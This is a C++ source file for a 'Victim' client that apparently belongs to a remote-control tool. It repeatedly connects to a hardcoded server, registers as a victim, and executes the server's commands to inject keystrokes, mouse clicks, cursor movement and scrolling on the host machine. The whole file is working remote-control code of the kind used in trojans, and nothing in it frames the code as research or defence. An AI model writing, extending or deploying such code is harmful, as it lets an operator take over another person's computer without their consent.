#include "victim.h"

Victim::Victim()
{    
    for (int i = 0; i < 256; i++)
        keysStates[i] = false;
    connectServer();
}

int Victim::controlVictim()
{
    while (isRunning)
    {
        sf::Packet p;
        server.receive(p);

        if (p.getDataSize() == 0) {
            std::cout << "DISCONNECTED FROM SERVER\n";
            connectServer();
        }

        sf::Uint8 cmd;
        p >> cmd;
        
        //exit program
        if (cmd == 'e') {
            isRunning = false;
        }
        //key pressed-released
        else if (cmd == 'n' || cmd == 'm') {
            sf::Uint8 vkc;
            p >> vkc;

            bool state = (cmd == 'n');
            keysStates[vkc] = state;

            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
            else
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
        }
        //mouse moved
        else if (cmd == 'l') {
            sf::Uint16 a, b;
            p >> a >> b;
            float x = a / (256.f * 256.f) * screenSize.x;
            float y = b / (256.f * 256.f) * screenSize.y;
            Mlib::Mouse::setPos(Mlib::Vec2i(x, y));
        }
        //wheel scrolled
        else if (cmd == 'k') {
            sf::Int8 delta;
            p >> delta;
            Mlib::Mouse::simulateScroll(delta * 100.f);
        }
        //release all keys
        else if (cmd == 'a') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }
        }
        //apparently victim isnt initialized
        else if (cmd == '?') {
            connectServer();
        }
    }

    return 0;
}

void Victim::connectServer()
{
    isConnected = false;
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

init:
    sf::Uint8 role = '-';
    sf::Packet p;
    p << sf::Uint8('v');
    server.send(p);
    p.clear();
    server.receive(p);
    p >> role;
    if (role != 'v')
        goto init;
    std::cout << "connection with server approved\n";

    isConnected = true;
}
